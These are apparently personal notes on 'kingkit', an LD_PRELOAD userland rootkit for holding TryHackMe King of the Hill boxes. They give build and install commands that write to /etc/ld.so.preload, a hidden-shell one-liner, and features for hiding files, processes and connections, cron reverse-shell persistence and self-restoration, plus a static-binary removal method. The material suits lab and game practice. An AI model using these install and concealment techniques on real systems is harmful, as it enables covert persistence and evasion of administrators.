---
title: "kingkit"
type: docs
tags:
  - thm
  - koth
  - king-of-the-hill
  - tooling
  - rootkit
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **Mode:** King of the Hill

</div>

<div class="callout callout-note">

**Tooling, not a box writeup**

These are my working notes for kingkit, an `LD_PRELOAD` userland rootkit I put together specifically for holding King of the Hill boxes on TryHackMe. This is not a traditional walkthrough with a foothold and a flag, it is a reference for a tool I built and reach for whenever I need to defend a compromised host against other players trying to take it back. I am writing down the build steps, the feature set, and the removal procedure here because I use this often enough that I would rather have it documented than reconstruct it from memory every round.

</div>

<div class="callout callout-danger">

**Compile on-target**

Because of conflicting glibc versions you must compile on a KotH machine. Easiest: compile on the **food** machine (available as its own room), then reuse that binary everywhere. Set the `KING_NAME` macro to your nickname first.

</div>

## Build & install

Compiling it is straightforward once I have set the header macros for the target round. I build it as a shared object so it can be loaded through `LD_PRELOAD`, and I link against `libdl` since the rootkit resolves the real libc symbols at runtime through `dlsym` before hooking them:

```bash
gcc kingkit.c -shared -fPIC -ldl -o kingkit.so
```

Installing it is then just a matter of dropping the compiled library somewhere persistent and telling the dynamic linker to preload it into every process that starts from that point on:

```bash
cp ./kingkit.so /lib/kingkit.so
echo "/lib/kingkit.so" > /etc/ld.so.preload
```

## Features

- Protect and write your name to `king.txt`
- Redirect writes to `/etc/ld.so.preload` to a `FAKE_PRELOAD`
- Protect the rootkit library and `FAKE_PRELOAD`
- Hide files/dirs starting with `HIDE_PREFIX` or with gid `HIDDEN_GID`
- Reverse-shell persistence (hooks `time()` in cron)
- Hide processes and connections from `netstat`, `ps`, `lsof`
- Automatic restoration of the library after deletion

## Usage notes

| Task | How |
| --- | --- |
| Hide a file | `chgrp HIDDEN_GID file` (default `HIDDEN_GID` = 5005); also any name starting with `HIDE_PREFIX` is hidden from `ls` (still accessible) |
| Un-hide | `chgrp root file` |
| Hidden shell | `python3 -c 'import os;os.setgid(HIDDEN_GID);os.system("/bin/bash")'` |
| Hidden connections | only IPv4 TCP/UDP to the `HOST` macro IP are hidden |
| Reverse shell | set `HOST`/`PORT` macros, then `systemctl restart cron` so cron loads the rootkit; fires every minute, process auto-hidden |
| Advanced persistence | set `ADVANCED_PERSISTENCE=1`, restores itself when deleted (hard to remove, even for you) |

## Removing an LD_PRELOAD rootkit

The one weakness I always keep in my back pocket for cleanup is that statically linked binaries never go through the dynamic linker's preload mechanism, so a static binary runs unaffected by `LD_PRELOAD` no matter how many libc calls the rootkit has hooked. That is exactly how I remove it once I am done with a round:

```bash
chmod +x remove && ./remove          # ships a static binary that clears /etc/ld.so.preload
# or build it:  gcc remove.c -static -o remove
unset LD_PRELOAD                      # also clear the env var
```

## References

- [Memory Malware Part 0x2, Crafting LD_PRELOAD Rootkits in Userland](https://compilepeace.medium.com/memory-malware-part-0x2-writing-userland-rootkits-via-ld-preload-30121c8343d5)
- [Creating a Rootkit to Learn C (h0mbre)](https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/)
- [awesome-linux-rootkits](https://github.com/milabs/awesome-linux-rootkits)

<div class="callout callout-caution">

**Educational use only. No responsibility taken for damage caused.**


</div>
